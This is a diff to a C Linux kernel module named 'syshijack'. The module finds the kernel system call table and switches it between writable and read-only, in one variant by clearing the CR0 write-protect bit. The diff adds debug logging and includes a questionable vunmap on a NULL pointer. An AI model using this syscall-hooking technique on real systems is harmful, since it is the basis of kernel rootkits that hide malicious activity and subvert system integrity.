@@ -1,20 +1,6 @@
 #include "syshijack.h"
 
 /*****************************************************************************\
-| Define which method (1, 2 or 3) will be used to set sct to RO/RW            |
-| Method 1 will use kernel pages and vmap                                     |
-| Method 2 will use virtual address                                           |
-| Method 3 will disable cr0, reg 16                                           |
-\*****************************************************************************/
-
-#define method 1
-
-/*****************************************************************************\
-|                                      END                                    |
-\*****************************************************************************/
-
-
-/*****************************************************************************\
 | /proc related vars                                                          |
 \*****************************************************************************/
 
@@ -177,14 +163,18 @@ int get_sct(void){
 	if(sys_call_table == NULL){
 		printk(KERN_INFO "sys_call_table is NULL\n");
 		ret = 0;
+	}else{
+		DEBUG(KERN_INFO "get_sct sct: %p\n", sys_call_table);
 	}
 
 #ifdef CONFIG_IA32_EMULATION
 	ia32_sys_call_table = get_ia32_sys_call_table();
 	if(ia32_sys_call_table == NULL){
-		vunmap((void*)((unsigned long)sys_call_table & PAGE_MASK));
+		vunmap((void*)((unsigned long)ia32_sys_call_table & PAGE_MASK)); //KEEP?
 		printk(KERN_INFO "ia32_sys_call_table is NULL\n");
 		ret = 0;
+	}else{
+		DEBUG(KERN_INFO "get_sct ia32_sct: %p\n", ia32_sys_call_table);
 	}
 #endif
 
@@ -194,16 +184,21 @@ int get_sct(void){
 int set_sct_rw(void){
 #if method == 1
 	sys_call_table = get_writable_sct(sys_call_table);
+	DEBUG(KERN_INFO "set_sct_rw method 1: %p\n", sys_call_table);
 #elif method == 2
 	make_rw((unsigned long)sys_call_table);
+	DEBUG(KERN_INFO "set_sct_rw method 2: %p\n", sys_call_table);
 #elif method == 3
 	orig_cr0 = clear_and_return_cr0(); //call only once for both archs
+	DEBUG(KERN_INFO "set_sct_rw method 3 cr0: %lu\n", orig_cr0);
 #endif
 #ifdef CONFIG_IA32_EMULATION
 #if method == 1
 	ia32_sys_call_table = get_writable_sct(ia32_sys_call_table);
+	DEBUG(KERN_INFO "set_sct_rw ia32_method 1: %p\n", ia32_sys_call_table);
 #elif method == 2
 	make_rw((unsigned long)ia32_sys_call_table);
+	DEBUG(KERN_INFO "set_sct_rw ia32_method 2: %p\n", ia32_sys_call_table);
 #endif
 #endif
 
@@ -212,16 +207,21 @@ int set_sct_rw(void){
 
 int set_sct_ro(void){
 #if method == 1
+	DEBUG(KERN_INFO "set_sct_ro method 1: %p\n", sys_call_table);
 	vunmap((void*)((unsigned long)sys_call_table & PAGE_MASK));
 #elif method == 2
+	DEBUG(KERN_INFO "set_sct_ro method 2: %p\n", sys_call_table);
 	make_ro((unsigned long)sys_call_table);
 #elif method == 3
+	DEBUG(KERN_INFO "set_sct_ro method 3 cr0: %lu\n", orig_cr0);
 	setback_cr0(orig_cr0); //call only once for both archs
 #endif
 #ifdef CONFIG_IA32_EMULATION
 #if method == 1
+	DEBUG(KERN_INFO "set_sct_ro ia32_method 1: %p\n", ia32_sys_call_table);
 	vunmap((void*)((unsigned long)ia32_sys_call_table & PAGE_MASK));
 #elif method == 2
+	DEBUG(KERN_INFO "set_sct_ro ia32_method 2: %p\n", ia32_sys_call_table);
 	make_ro((unsigned long)ia32_sys_call_table);
 #endif
 #endif
